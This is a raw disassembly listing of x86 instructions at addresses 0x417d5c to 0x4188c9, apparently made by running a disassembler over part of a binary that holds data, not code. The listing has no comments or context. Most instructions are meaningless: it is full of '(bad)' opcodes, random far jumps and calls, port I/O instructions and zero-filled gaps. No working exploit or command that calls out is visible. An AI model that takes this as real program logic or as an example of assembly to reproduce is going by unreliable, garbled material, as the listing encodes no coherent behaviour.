  417d5c:	or     al,BYTE PTR [esi]
  417d5e:	and    dh,BYTE PTR [edi-0x77]
  417d61:	mov    dl,0x3c
  417d63:	mov    ebp,0x5bd911b8
  417d68:	push   es
  417d69:	xchg   ebx,eax
  417d6a:	aam    0xa8
  417d6c:	into   
  417d6d:	pop    eax
  417d6e:	scas   eax,DWORD PTR es:[edi]
  417d6f:	sbb    eax,0x27d26965
  417d74:	and    eax,0xe0355d6f
  417d79:	push   ss
  417d7a:	fwait
  417d7b:	jbe    0x417dc5
  417d7d:	sbb    BYTE PTR [ebp+0x44],dl
  417d80:	or     eax,0xc9628519
  417d85:	adc    al,0xb4
  417d87:	xor    BYTE PTR [ebx],dl
  417d89:	cmp    DWORD PTR [esi],edx
  417d8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d8c:	std    
  417d8d:	or     BYTE PTR [ecx-0x5ab6db96],0x2b
  417d94:	push   0xffffff8c
  417d96:	inc    esp
  417d97:	mov    DWORD PTR [eax+0x10b957a2],esi
  417d9d:	mov    bh,0x8e
  417d9f:	and    ch,BYTE PTR [ecx+0x73]
  417da2:	xchg   DWORD PTR [ebx+0x5cddf188],esp
  417da8:	xor    edi,DWORD PTR [ebx]
  417daa:	lods   al,BYTE PTR ds:[esi]
  417dab:	inc    esp
  417dac:	push   edx
  417dad:	cmp    DWORD PTR [ebp-0x76],0xffffffb0
  417db1:	sub    BYTE PTR [eax+0x3952af93],0x26
  417db8:	sbb    BYTE PTR [edx-0x6e],bl
  417dbb:	adc    al,0x31
  417dbd:	mov    esp,0xc832e1
	...
  417e32:	add    BYTE PTR [eax],al
  417e34:	mov    edi,0xae6d8e19
  417e39:	(bad)  
  417e3a:	(bad)  
  417e3b:	(bad)  
  417e3d:	xlat   BYTE PTR ds:[ebx]
  417e3e:	aam    0xef
  417e40:	pop    edi
  417e41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e42:	cld    
  417e43:	or     DWORD PTR [esp+eax*1],ebp
  417e46:	add    DWORD PTR [eax],eax
  417e48:	cmc    
  417e49:	add    BYTE PTR [eax],al
  417e4b:	add    BYTE PTR [ecx+eiz*8],cl
  417e4e:	test   al,al
  417e50:	cli    
  417e51:	call   0xa19c:0x631c4fae
  417e58:	dec    esp
  417e59:	test   edx,edi
  417e5b:	int3   
  417e5c:	adc    esp,DWORD PTR [ebx-0x42]
  417e5f:	dec    edx
  417e60:	push   esp
  417e61:	pusha  
  417e62:	pop    ebp
  417e63:	or     DWORD PTR [esi-0x5a13e346],ebp
  417e69:	mov    ecx,0x254c8f28
  417e6e:	add    eax,0x28ec8db4
  417e73:	in     al,dx
  417e74:	xchg   edi,eax
  417e75:	mov    dh,0x2
  417e77:	(bad)  
  417e78:	(bad)  
  417e79:	imul   ebx,DWORD PTR [ebx],0xf54bd539
  417e7f:	in     al,0xb4
  417e81:	lods   al,BYTE PTR ds:[esi]
  417e82:	adc    al,0x8d
  417e84:	jmp    0x264c:0x3d1fcde7
  417e8b:	fs iret 
  417e8d:	cmp    BYTE PTR [ecx-0x40fd1d98],0xe
  417e94:	icebp  
  417e95:	pop    eax
  417e96:	sahf   
  417e97:	xlat   BYTE PTR ds:[ebx]
  417e98:	sub    bh,0xeb
  417e9b:	or     edx,DWORD PTR [ecx-0x5f]
  417e9e:	into   
  417e9f:	pop    ecx
  417ea0:	ins    DWORD PTR es:[edi],dx
  417ea1:	jmp    0x495630bf
  417ea6:	daa    
  417ea7:	ror    edx,0x88
  417eaa:	stos   BYTE PTR es:[edi],al
  417eab:	xor    al,0x77
  417ead:	xor    eax,DWORD PTR [edx]
  417eaf:	jno    0x417ec7
  417eb1:	imul   ecx,DWORD PTR [esi+0x2a],0xf8a0bdec
  417eb8:	pop    esp
  417eb9:	or     edi,ebp
  417ebb:	daa    
  417ebc:	sbb    al,0xe7
  417ebe:	xchg   ecx,eax
  417ebf:	cdq    
  417ec0:	dec    edx
  417ec1:	ror    DWORD PTR [edx],0xf0
  417ec4:	sahf   
  417ec5:	cs fs dec ebp
  417ec8:	ds ss loop 0x417eca
  417ecc:	loope  0x417eaa
  417ece:	daa    
  417ecf:	add    DWORD PTR [ebp-0x1d58d493],edx
  417ed5:	xchg   esp,eax
  417ed6:	test   al,0xfd
  417ed8:	adc    eax,0xad20f2ec
  417edd:	mov    ah,0x85
  417edf:	(bad)  
  417ee1:	popa   
  417ee2:	mov    esi,0xf3210f7b
  417ee7:	clc    
  417ee8:	jns    0x417f59
  417eea:	outs   dx,DWORD PTR ds:[esi]
  417eeb:	cld    
  417eec:	stc    
  417eed:	(bad)  
  417eee:	mov    al,0x4a
  417ef0:	mov    ebp,0xf2f08c6d
  417ef5:	and    BYTE PTR [esi],bl
  417ef7:	rcr    BYTE PTR [eax+edx*8+0x17],cl
  417efb:	addr16 pop edi
  417efd:	clc    
  417efe:	pop    edi
  417eff:	shl    BYTE PTR [ebp-0x64b31dec],1
  417f05:	cmp    DWORD PTR [ebp+ebx*8-0x279ae9f3],ebx
  417f0c:	arpl   WORD PTR [eax],bx
  417f0e:	rcl    DWORD PTR [ebx-0x36],cl
  417f11:	jmp    0xa9b969d8
  417f16:	iret   
  417f17:	aas    
  417f18:	in     al,dx
  417f19:	and    ecx,DWORD PTR [edx+0x3b20216e]
  417f1f:	mov    ecx,0x99946516
  417f24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f25:	call   0xa66767d8
  417f2a:	cmp    BYTE PTR [esi-0x38],dh
  417f2d:	fadd   QWORD PTR [edx]
  417f2f:	mov    dh,0x9e
  417f31:	xchg   esi,eax
  417f32:	outs   dx,DWORD PTR ds:[esi]
  417f33:	pop    edx
  417f34:	mov    eax,0xeed63b4a
  417f39:	rcr    DWORD PTR ds:0x90830f2,0xbb
  417f40:	das    
	...
  417fb1:	add    BYTE PTR [eax],al
  417fb3:	add    BYTE PTR [esi+0x2d],dh
  417fb6:	push   ebp
  417fb7:	inc    ecx
  417fb8:	pop    edi
  417fb9:	jns    0x418031
  417fbb:	aas    
  417fbc:	fisttp DWORD PTR [esi-0x68]
  417fbf:	inc    edx
  417fc0:	and    BYTE PTR [eax+ebp*4+0x51],dl
  417fc4:	and    DWORD PTR ds:0xf50001,eax
  417fca:	add    BYTE PTR [eax],al
  417fcc:	dec    edi
  417fcd:	or     eax,0xd026e54e
  417fd2:	mov    dl,0xe2
  417fd4:	cld    
  417fd5:	pop    eax
  417fd6:	sbb    eax,0x4b0ec59d
  417fdb:	test   eax,0xdd674eb2
  417fe0:	sbb    bl,ch
  417fe2:	mov    al,ds:0x224515aa
  417fe7:	scas   al,BYTE PTR es:[edi]
  417fe8:	adc    BYTE PTR [esi+0x7e],al
  417feb:	inc    ecx
  417fec:	repz push edi
  417fee:	jge    0x417fae
  417ff0:	mov    eax,ds:0xbfd83447
  417ff5:	sub    ebp,DWORD PTR [edx]
  417ff7:	sub    BYTE PTR [edi-0x52],cl
  417ffa:	or     eax,0xdae3a455
  417fff:	icebp  
  418000:	xor    eax,0x185cefb2
  418005:	mov    ebx,0x54597c27
  41800a:	repz les ebx,FWORD PTR [edi-0x7634e29e]
  418011:	push   edx
  418012:	sbb    eax,0xb163480
  418017:	mov    dh,0xaf
  418019:	pop    edx
  41801a:	cld    
  41801b:	mov    cl,0xd8
  41801d:	leave  
  41801e:	inc    ecx
  41801f:	outs   dx,DWORD PTR ds:[esi]
  418020:	dec    ecx
  418021:	and    BYTE PTR [eax-0x145779fe],bh
  418027:	inc    edx
  418028:	cld    
  418029:	in     eax,dx
  41802a:	out    dx,al
  41802b:	pop    esi
  41802c:	repnz add esp,DWORD PTR [ebp+0x2272b1cf]
  418033:	ins    BYTE PTR es:[edi],dx
  418034:	mov    ch,ah
  418036:	jl     0x418019
  418038:	sub    eax,0xb70fcbf6
  41803d:	jg     0x4180ae
  41803f:	mov    ebx,0x633b690
  418044:	mov    al,ds:0xc5671202
  418049:	fmul   DWORD PTR [edx]
  41804b:	or     eax,0x3faca256
  418050:	data16 (bad) 
  418052:	out    0x55,al
  418054:	add    DWORD PTR [ecx+0x3c],esp
  418057:	fisttp WORD PTR [esi-0x46a9cb88]
  41805d:	inc    esp
  41805e:	mov    DWORD PTR [eax],esp
  418060:	xor    DWORD PTR [eax+0x1c],edi
  418063:	inc    ebx
  418064:	add    ch,cl
  418066:	in     al,0x14
  418068:	jno    0x418088
  41806a:	jmp    0x418078
  41806c:	inc    esi
  41806d:	ficom  WORD PTR [edi-0x4bc82a39]
  418073:	sbb    esp,DWORD PTR [eax]
  418075:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418076:	test   eax,0xa14ea6a9
  41807b:	and    al,0x60
  41807d:	mov    ds:0xe5c9bae3,eax
  418082:	clc    
  418083:	lock xor dh,BYTE PTR [ecx]
  418086:	cmp    BYTE PTR [esi],ah
  418088:	std    
  418089:	test   eax,0x38319580
  41808e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41808f:	sbb    ebp,eax
  418091:	es jle 0x4180b7
  418094:	xor    al,0x62
  418096:	hlt    
  418097:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418098:	add    bl,BYTE PTR es:[esp+eiz*4-0x79ec15a8]
  4180a0:	ss out 0x5,eax
  4180a3:	ret    
  4180a4:	mov    dl,0x52
  4180a6:	dec    esi
  4180a7:	mov    ah,BYTE PTR [edi+0x9]
  4180aa:	out    0xc4,al
  4180ac:	stos   BYTE PTR es:[edi],al
  4180ad:	shl    BYTE PTR [esi],0xb6
  4180b0:	dec    ecx
  4180b1:	sbb    ah,0x5f
  4180b4:	jge    0x418038
  4180b6:	repnz and al,0x8b
  4180b9:	sbb    BYTE PTR [ebx],0x67
  4180bc:	xchg   edx,eax
  4180bd:	jb     0x41809f
  4180bf:	push   ss
  4180c0:	push   esi
	...
  418131:	add    BYTE PTR [eax],al
  418133:	add    BYTE PTR [esi-0xe58fe7],ah
  418139:	jnp    0x418129
  41813b:	mov    ebp,0xe8ea9e45
  418140:	addr16 xchg esi,eax
  418142:	adc    ecx,DWORD PTR [esi+0x10616]
  418148:	cmc    
  418149:	add    BYTE PTR [eax],al
  41814b:	add    BYTE PTR [edi],al
  41814d:	push   ecx
  41814e:	or     dl,BYTE PTR ds:0x4196c015
  418154:	popf   
  418155:	dec    eax
  418156:	mov    es,WORD PTR [ebp+edi*1-0x5f]
  41815a:	push   esi
  41815b:	dec    esp
  41815c:	mov    ebx,DWORD PTR [ebx+0x4a9061c4]
  418162:	push   ebx
  418163:	xchg   ebp,eax
  418164:	inc    edx
  418165:	in     eax,dx
  418166:	adc    ebx,ebp
  418168:	arpl   WORD PTR [esi-0xa],sp
  41816b:	js     0x41815b
  41816d:	(bad)  
  41816e:	push   eax
  41816f:	or     eax,0xf7e2ae81
  418174:	inc    edi
  418175:	shl    BYTE PTR [eax-0x752bb6c6],1
  41817b:	mov    esi,0xed8c7087
  418180:	out    0x66,eax
  418182:	pop    ebp
  418183:	mov    ch,BYTE PTR [ecx+0x67]
  418186:	adc    ebp,DWORD PTR [edx-0xba4ce85]
  41818c:	jp     0x41817c
  41818e:	cwde   
  41818f:	(bad)  
  418190:	shr    DWORD PTR [ebp+0x317cd3e2],1
  418196:	jle    0x418189
  418198:	lods   al,BYTE PTR ds:[esi]
  418199:	sbb    eax,ebx
  41819b:	xchg   eax,edi
  41819d:	xchg   edi,eax
  41819e:	push   ss
  41819f:	xor    eax,0x5f02e4b3
  4181a4:	sub    al,0xe7
  4181a6:	fs (bad) 
  4181a8:	xor    al,0xaf
  4181aa:	shl    BYTE PTR [ebp+0x63],1
  4181ad:	push   ss
  4181ae:	mov    esp,0x14122016
  4181b3:	add    eax,DWORD PTR [eax+0x46495f31]
  4181b9:	mov    ebx,0x3a24385f
  4181be:	fbstp  TBYTE PTR [edi+0x24fc2e8f]
  4181c4:	inc    ebx
  4181c5:	fstp   st(1)
  4181c7:	bound  esp,QWORD PTR [edi]
  4181c9:	rol    ebp,0x49
  4181cc:	mov    ah,0xb5
  4181ce:	cmp    BYTE PTR [ebx],0x1c
  4181d1:	out    dx,al
  4181d2:	dec    edx
  4181d3:	and    BYTE PTR [edx],bh
  4181d5:	out    dx,al
  4181d6:	mov    ss,edi
  4181d8:	jl     0x41822a
  4181da:	mov    bh,0x15
  4181dc:	clc    
  4181dd:	push   ebx
  4181de:	ror    DWORD PTR [ebp-0x70dc01d2],1
  4181e4:	jo     0x4181fe
  4181e6:	test   BYTE PTR [esi],cl
  4181e8:	mov    al,0x5d
  4181ea:	pop    ss
  4181eb:	jmp    0xde535cf
  4181f0:	cmp    edx,DWORD PTR [eax]
  4181f2:	or     DWORD PTR [ecx],edi
  4181f4:	push   esi
  4181f5:	out    dx,al
  4181f6:	or     al,BYTE PTR [edx]
  4181f8:	out    dx,al
  4181f9:	enter  0xeb7,0xa5
  4181fd:	je     0x41820c
  4181ff:	add    BYTE PTR [esi+eax*8-0x34914577],bl
  418206:	stc    
  418207:	cs push ebx
  418209:	stos   BYTE PTR es:[edi],al
  41820a:	mov    ch,0x40
  41820c:	loop   0x418192
  41820e:	test   eax,0x87c1e0cc
  418213:	arpl   WORD PTR [edi-0x3b],si
  418216:	sbb    DWORD PTR [eax],ecx
  418218:	shl    DWORD PTR [edx+0x1b],1
  41821b:	jge    0x418245
  41821d:	add    bh,ah
  41821f:	lods   eax,DWORD PTR ds:[esi]
  418220:	scas   eax,DWORD PTR es:[edi]
  418221:	pop    ds
  418222:	cld    
  418223:	lods   eax,DWORD PTR ds:[esi]
  418224:	aad    0xc9
  418226:	xor    eax,0x3e14d822
  41822b:	jno    0x4181dc
  41822d:	add    al,0xe2
  41822f:	pop    esp
  418230:	dec    esp
  418231:	cmp    BYTE PTR [edi+0x40],ch
  418234:	mul    DWORD PTR [ebp+0x51b74652]
  41823a:	sti    
  41823b:	fld    DWORD PTR [edi+0x1c036cb8]
	...
  4182b1:	add    BYTE PTR [eax],al
  4182b3:	add    BYTE PTR [ecx-0x44],ch
  4182b6:	xlat   BYTE PTR ds:[ebx]
  4182b7:	pop    esi
  4182b8:	xlat   BYTE PTR ds:[ebx]
  4182b9:	jg     0x4182a4
  4182bb:	mov    edi,0x113ef3ec
  4182c0:	fs ret 0xa497
  4182c4:	or     eax,DWORD PTR [edi]
  4182c6:	add    DWORD PTR [eax],eax
  4182c8:	cmc    
  4182c9:	add    BYTE PTR [eax],al
  4182cb:	add    BYTE PTR [esi-0x69ee40f4],ch
  4182d1:	mov    BYTE PTR cs:[edi],dh
  4182d4:	jp     0x4182f2
  4182d6:	xor    esi,DWORD PTR [ebx-0x60208bd8]
  4182dc:	dec    ecx
  4182dd:	dec    ebp
  4182de:	test   BYTE PTR [ebx],dh
  4182e0:	cmp    al,BYTE PTR [eax]
  4182e2:	and    eax,0x127274e8
  4182e7:	jae    0x4182eb
  4182e9:	add    eax,0xb22cb916
  4182ee:	cmp    eax,0xc15432e2
  4182f3:	xchg   ecx,eax
  4182f4:	jle    0x418301
  4182f6:	jmp    0x8f2d:0x55b11b18
  4182fd:	fild   WORD PTR [ebp-0x55]
  418300:	aas    
  418301:	sub    BYTE PTR [ecx],dh
  418303:	test   DWORD PTR [esi+0x2b],ecx
  418306:	add    al,0x40
  418308:	or     BYTE PTR [ebp+0x5],al
  41830b:	pop    esp
  41830c:	mov    esp,es
  41830e:	daa    
  41830f:	or     DWORD PTR [edx+0x56f0d348],edx
  418315:	clc    
  418316:	sbb    BYTE PTR ds:0xe8abddc5,bl
  41831c:	jp     0x418355
  41831e:	rol    BYTE PTR [edi],1
  418320:	xor    dh,BYTE PTR [ebx+0x789d5fa7]
  418326:	stos   DWORD PTR es:[edi],eax
  418327:	iret   
  418328:	(bad)  
  418329:	retf   
  41832a:	add    al,0x41
  41832c:	mov    ds:0x2d9c40ae,eax
  418331:	sub    BYTE PTR [ecx-0x1edb1b61],bl
  418337:	or     bh,BYTE PTR [ecx+0x68514aa0]
  41833d:	mov    ah,0x75
  41833f:	push   0xac599b2
  418344:	outs   dx,BYTE PTR ds:[esi]
  418345:	sub    dh,0xf6
  418348:	gs test BYTE PTR ds:[ebp+0x26],ah
  41834d:	hlt    
  41834e:	pop    esi
  41834f:	push   esi
  418350:	sub    ebp,DWORD PTR [eax+0x2b2831b7]
  418356:	sub    DWORD PTR [edi+edi*2+0x22],ebx
  41835a:	repz pop eax
  41835c:	sub    DWORD PTR [edx-0x342cb728],ebp
  418362:	xchg   edx,eax
  418363:	jns    0x4183a2
  418365:	mov    cl,0x7d
  418367:	or     BYTE PTR [ebx],dl
  418369:	test   BYTE PTR [ebx-0x15b65e7],0xfb
  418370:	dec    ebp
  418371:	sbb    ebx,esi
  418373:	jo     0x418376
  418375:	adc    BYTE PTR es:[eax],0x6c
  418379:	es loope 0x418335
  41837c:	fisttp QWORD PTR [eax+0x4f]
  41837f:	mov    bh,0x92
  418381:	push   esi
  418382:	xlat   BYTE PTR ds:[ebx]
  418383:	out    dx,al
  418384:	push   0x20
  418386:	add    ah,al
  418388:	call   0x2788726f
  41838d:	cmp    BYTE PTR [edx-0x47],0xc2
  418391:	sar    DWORD PTR [ecx],cl
  418393:	xor    al,0xc6
  418395:	idiv   DWORD PTR [edx-0x520da1a]
  41839b:	jmp    0x41841c
  41839d:	ss int 0x8f
  4183a0:	pop    ss
  4183a1:	and    DWORD PTR [edx],0x3a
  4183a4:	retf   
  4183a5:	clc    
  4183a6:	adc    ebx,edi
  4183a8:	mov    DWORD PTR [edx],edx
  4183aa:	addr16 push cs
  4183ac:	jge    0x418381
  4183ae:	sbb    al,0xc9
  4183b0:	jnp    0x4183af
  4183b2:	mov    ds:0x64c7d278,eax
  4183b7:	jbe    0x41837f
  4183b9:	ja     0x4183c0
  4183bb:	das    
  4183bc:	sub    eax,0xaa090b15
	...
  418431:	add    BYTE PTR [eax],al
  418433:	add    BYTE PTR [ecx+0x6b0c6aba],dl
  418439:	fdivr  st(7),st
  41843b:	mov    edi,0xdccd8f2d
  418440:	fwait
  418441:	cmp    edi,esi
  418443:	test   BYTE PTR [eax],0x8
  418446:	add    DWORD PTR [eax],eax
  418448:	cmc    
  418449:	add    BYTE PTR [eax],al
  41844b:	add    BYTE PTR ds:0xf6e05af3,cl
  418451:	cmp    cl,BYTE PTR [esi]
  418453:	pop    ds
  418454:	idiv   BYTE PTR [ebx+0x70]
  418457:	xchg   esi,eax
  418458:	loopne 0x418495
  41845a:	imul   edi,edi,0xffffffd1
  41845d:	push   ebx
  41845e:	push   ebp
  41845f:	mov    DWORD PTR [esi],esi
  418461:	loop   0x4184b1
  418463:	mov    esi,0xd4ee30f
  418468:	into   
  418469:	mov    cl,0x33
  41846b:	dec    esi
  41846c:	ret    0xd859
  41846f:	int    0x86
  418471:	loop   0x41843a
  418473:	jae    0x418479
  418475:	mov    dh,0x7b
  418477:	xor    DWORD PTR [ebx-0xc],0x13
  41847b:	jmp    0xed32a4da
  418480:	jbe    0x4184f4
  418482:	fs clc 
  418484:	inc    edx
  418485:	(bad)  
  418487:	jno    0x41841d
  418489:	xor    edx,ebx
  41848b:	imul   ebx,DWORD PTR [eax+0xf],0x1b44b87a
  418492:	mov    ebx,0x7e037cb
  418497:	icebp  
  418498:	repz pop ds
  41849a:	add    eax,0xa14e936
  41849f:	lock icebp 
  4184a1:	lahf   
  4184a2:	xor    al,0xa3
  4184a4:	pop    esi
  4184a5:	scas   eax,DWORD PTR es:[edi]
  4184a6:	and    eax,0x6e5fffa9
  4184ab:	into   
  4184ac:	cmp    dl,BYTE PTR ds:0x2c272bf8
  4184b2:	mov    ds:0x16ebde2d,eax
  4184b7:	rcr    al,1
  4184b9:	fmul   DWORD PTR [edx]
  4184bb:	pushf  
  4184bc:	dec    ebp
  4184bd:	inc    ecx
  4184be:	std    
  4184bf:	fcomp  DWORD PTR [esi+0x12]
  4184c2:	push   ecx
  4184c3:	inc    ebp
  4184c4:	push   esi
  4184c5:	dec    ebp
  4184c6:	ja     0x41848c
  4184c8:	or     al,0xe3
  4184ca:	in     eax,0x5b
  4184cc:	mov    al,0xfb
  4184ce:	test   eax,0xf9571eff
  4184d3:	inc    edi
  4184d4:	dec    ebx
  4184d5:	jae    0x4184fc
  4184d7:	mov    bh,0xcc
  4184d9:	aam    0xb9
  4184db:	call   0xa470:0x2b4addf1
  4184e2:	mov    WORD PTR [edx+ebp*4],fs
  4184e5:	jmp    0x65974f0f
  4184ea:	and    dl,BYTE PTR ds:0xf287758c
  4184f0:	or     edx,0x47e08437
  4184f6:	sbb    eax,0x664312f
  4184fb:	push   edx
  4184fc:	mov    ds:0x2203b9f7,al
  418501:	add    ebp,esi
  418503:	iret   
  418504:	mov    eax,0xc303874e
  418509:	and    edi,0xffffffac
  41850c:	or     DWORD PTR [edi+0x3f],esp
  41850f:	dec    ebp
  418510:	dec    ebx
  418511:	imul   eax,DWORD PTR ds:0x664c3017,0x58
  418518:	popa   
  418519:	lea    ebp,[edi-0x56a2b774]
  41851f:	xor    eax,0xc7d12497
  418524:	aad    0xa8
  418526:	sub    eax,0x511393e7
  41852b:	arpl   WORD PTR [ecx-0x4c],dx
  41852e:	ror    DWORD PTR [eax],0x58
  418531:	or     DWORD PTR ds:0xe52d49dc,ebp
  418537:	adc    eax,0xba477638
  41853c:	and    al,0xe4
  41853e:	stos   DWORD PTR es:[edi],eax
  41853f:	scas   eax,DWORD PTR es:[edi]
  418540:	mov    al,0x0
	...
  4185b2:	add    BYTE PTR [eax],al
  4185b4:	test   eax,0xdf4fd367
  4185b9:	(bad)  
  4185ba:	mov    ebp,0x15c03be7
  4185bf:	stc    
  4185c0:	scas   al,BYTE PTR es:[edi]
  4185c1:	mov    cl,0xca
  4185c3:	push   ds
  4185c4:	cmc    
  4185c5:	or     BYTE PTR [ecx],al
  4185c7:	add    ch,dh
  4185c9:	add    BYTE PTR [eax],al
  4185cb:	add    BYTE PTR [edi-0xa],al
  4185ce:	pop    ss
  4185cf:	adc    BYTE PTR [esi],dl
  4185d1:	retf   0xaa9b
  4185d4:	xchg   ebp,eax
  4185d5:	stos   DWORD PTR es:[edi],eax
  4185d6:	or     cl,BYTE PTR [esi+0x710b046d]
  4185dc:	fcomp  QWORD PTR [edi-0x5d9731c8]
  4185e2:	ret    0xbf4f
  4185e5:	or     edi,DWORD PTR [ecx+0x15e89e17]
  4185eb:	sahf   
  4185ec:	pop    edx
  4185ed:	pop    esp
  4185ee:	iret   
  4185ef:	jne    0x4185ae
  4185f1:	push   0x4b
  4185f3:	(bad)  
  4185f4:	dec    edi
  4185f5:	jl     0x41866f
  4185f7:	mov    ds:0x9a897a12,eax
  4185fc:	enter  0xa907,0xbd
  418600:	mov    bh,0xa
  418602:	pop    ds
  418603:	aam    0x1
  418605:	jnp    0x41864e
  418607:	dec    edi
  418608:	(bad)  [edi-0x57]
  41860b:	dec    esi
  41860c:	int3   
  41860d:	or     al,0xc7
  41860f:	jp     0x4185d2
  418611:	and    DWORD PTR [ebx+0x2c],0x78
  418615:	and    DWORD PTR [ebx],ebp
  418617:	(bad)  
  418618:	sub    DWORD PTR [edi+0x6d528562],esp
  41861e:	sbb    al,0x83
  418620:	push   ebp
  418621:	pop    edi
  418622:	pop    es
  418623:	inc    esi
  418624:	ss int 0x95
  418627:	pop    edi
  418628:	les    ecx,FWORD PTR [edx]
  41862a:	ds test eax,0x9d5c1912
  418630:	cmp    ah,BYTE PTR [edi]
  418632:	ja     0x4185ba
  418634:	dec    eax
  418635:	test   DWORD PTR [ebp+0x7],ecx
  418638:	bnd js 0x418660
  41863b:	stc    
  41863c:	mov    bl,dl
  41863e:	add    eax,0x80633f53
  418643:	out    dx,eax
  418644:	mov    ch,0x4a
  418646:	mov    bl,0xe7
  418648:	ss pop ebp
  41864a:	adc    esp,DWORD PTR [edi]
  41864c:	js     0x4185fa
  41864e:	sbb    DWORD PTR [esi+ebx*8],ecx
  418651:	dec    esi
  418652:	sub    BYTE PTR [ebx+esi*2],al
  418655:	ja     0x418614
  418657:	(bad)  
  418658:	and    edx,DWORD PTR [ecx+0x18f1b21d]
  41865e:	mov    eax,0xb468e1c9
  418663:	neg    BYTE PTR [ebx-0x6a]
  418666:	ins    BYTE PTR es:[edi],dx
  418667:	mov    BYTE PTR [edi],ah
  418669:	push   esi
  41866a:	nop
  41866b:	or     eax,0x3757afbd
  418670:	adc    eax,0x7523e4e8
  418675:	pop    esp
  418676:	das    
  418677:	lock cmc 
  418679:	lahf   
  41867a:	outs   dx,DWORD PTR ds:[esi]
  41867b:	mov    dh,0xd8
  41867d:	(bad)  
  41867e:	inc    ebx
  41867f:	adc    dh,BYTE PTR [ecx-0xd1476cf]
  418685:	and    cl,cl
  418687:	lods   al,BYTE PTR ds:[esi]
  418688:	mov    eax,ds:0xe2828479
  41868d:	mov    esp,0xc999981c
  418692:	test   DWORD PTR [ebx+0x1b],esp
  418695:	nop
  418696:	ins    DWORD PTR es:[edi],dx
  418697:	pop    edi
  418698:	jle    0x418623
  41869a:	mov    BYTE PTR [esi],al
  41869c:	fucomi st,st(2)
  41869e:	sbb    dl,bl
  4186a0:	add    al,0x2d
  4186a2:	or     BYTE PTR [esi+0x19bf256b],ch
  4186a8:	and    BYTE PTR [ebx],al
  4186aa:	retf   0x43dc
  4186ad:	fcmovbe st,st(3)
  4186af:	jnp    0x4186af
  4186b1:	mov    esp,0x7f983e2f
  4186b6:	and    bl,bh
  4186b8:	rcl    DWORD PTR [edi-0x45],0xfe
  4186bc:	inc    ebp
  4186bd:	sti    
  4186be:	mov    ah,0xb7
  4186c0:	mov    eax,0x0
	...
  418731:	add    BYTE PTR [eax],al
  418733:	add    cl,ch
  418735:	push   cs
  418736:	(bad)  
  418737:	pop    ss
  418738:	push   edi
  41873a:	jmp    0xecc1a73d
  41873f:	sub    ebp,DWORD PTR [edx]
  418741:	cdq    
  418742:	fdivr  QWORD PTR [ecx]
  418744:	jmp    0x0:0xf5000109
  41874b:	add    BYTE PTR [eax],bl
  41874d:	fnstsw WORD PTR [ecx+ebp*2-0x25c6de9b]
  418754:	sub    al,0x82
  418756:	ficom  WORD PTR [ecx-0xe]
  418759:	mov    eax,ds:0xf90e579a
  41875e:	push   ss
  41875f:	(bad)  
  418760:	cmp    al,BYTE PTR [edi+edi*8+0x18]
  418764:	push   esi
  418765:	adc    esi,DWORD PTR [eax]
  418767:	xor    BYTE PTR [ebx-0x2],dh
  41876a:	dec    esp
  41876b:	shl    DWORD PTR [edx-0x40fa65a0],0x5f
  418772:	push   esi
  418773:	mov    DWORD PTR [edi],ebp
  418775:	xor    al,0xde
  418777:	push   es
  418778:	clc    
  418779:	jnp    0x418714
  41877b:	ins    BYTE PTR es:[edi],dx
  41877c:	mov    WORD PTR [edi-0x3899d4c3],?
  418782:	(bad)  
  418783:	mov    ecx,0xe96799bb
  418788:	and    ecx,DWORD PTR [eax-0x5e8683c7]
  41878e:	nop
  41878f:	or     ch,BYTE PTR [ecx+0x4fd2b39e]
  418795:	sti    
  418796:	jnp    0x418788
  418798:	xor    al,0x65
  41879a:	jo     0x41873b
  41879c:	cmp    DWORD PTR [edx*4-0x16d530eb],ebp
  4187a3:	sub    BYTE PTR [ecx+0x769965a3],bh
  4187a9:	dec    esi
  4187aa:	xor    BYTE PTR [esi+0x6c],dh
  4187ad:	ret    0xd288
  4187b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187b1:	jge    0x41877c
  4187b3:	imul   edi,edi,0xa25c20f4
  4187b9:	jne    0x41878d
  4187bb:	xlat   BYTE PTR ds:[ebx]
  4187bc:	and    eax,0x7431e395
  4187c1:	pop    ebx
  4187c2:	mov    al,ds:0xec8aa31d
  4187c7:	clc    
  4187c8:	fiadd  WORD PTR [edi+edx*1-0x536d75c7]
  4187cf:	repz push edi
  4187d1:	push   ecx
  4187d2:	jo     0x41878c
  4187d4:	push   0x304298ff
  4187d9:	dec    eax
  4187da:	dec    esp
  4187db:	call   0xdd8b:0x4973e7a3
  4187e2:	mov    esp,0x9daeab7e
  4187e7:	adc    BYTE PTR fs:[esi],bl
  4187ea:	sub    al,0xdb
  4187ec:	into   
  4187ed:	mov    esi,0x46632bbe
  4187f2:	inc    ebx
  4187f3:	xchg   BYTE PTR [esi+edi*2-0x6c],ch
  4187f7:	cmp    edi,DWORD PTR [ecx]
  4187f9:	adc    DWORD PTR [edx-0x103616cd],ecx
  4187ff:	std    
  418800:	and    eax,0xb452ae5d
  418805:	sbb    ebp,DWORD PTR [ecx+0x12dab62a]
  41880b:	aad    0x93
  41880d:	jl     0x41888d
  41880f:	jp     0x41887a
  418811:	ss es inc edx
  418814:	(bad)  
  418815:	div    BYTE PTR [ebp-0x1b]
  418818:	dec    esp
  418819:	pop    es
  41881a:	pop    esp
  41881b:	or     al,0xf3
  41881d:	cmp    al,0x1d
  41881f:	mov    ecx,0x8360f2bb
  418824:	(bad)  
  418825:	fcomp  QWORD PTR [ebp-0x370c1af3]
  41882b:	xor    eax,0xaf71c7e7
  418830:	dec    ebx
  418831:	mov    ecx,0xa775f9f0
  418836:	daa    
  418837:	or     esp,DWORD PTR [esp+eax*8]
  41883a:	outs   dx,DWORD PTR ds:[esi]
  41883b:	mov    eax,ds:0xb71982c9
  418840:	out    dx,eax
	...
  4188b1:	add    BYTE PTR [eax],al
  4188b3:	add    BYTE PTR [eax+0x41],bl
  4188b6:	pop    ds
  4188b7:	lods   eax,DWORD PTR ds:[esi]
  4188b8:	pop    ds
  4188b9:	(bad)  
  4188ba:	cli    
  4188bb:	cmc    
  4188bc:	inc    ebx
  4188bd:	mov    ss:0xfe79d632,al
  4188c3:	mov    ebp,0x10adf
  4188c8:	cmc    
  4188c9:	add    BYTE PTR [eax],al
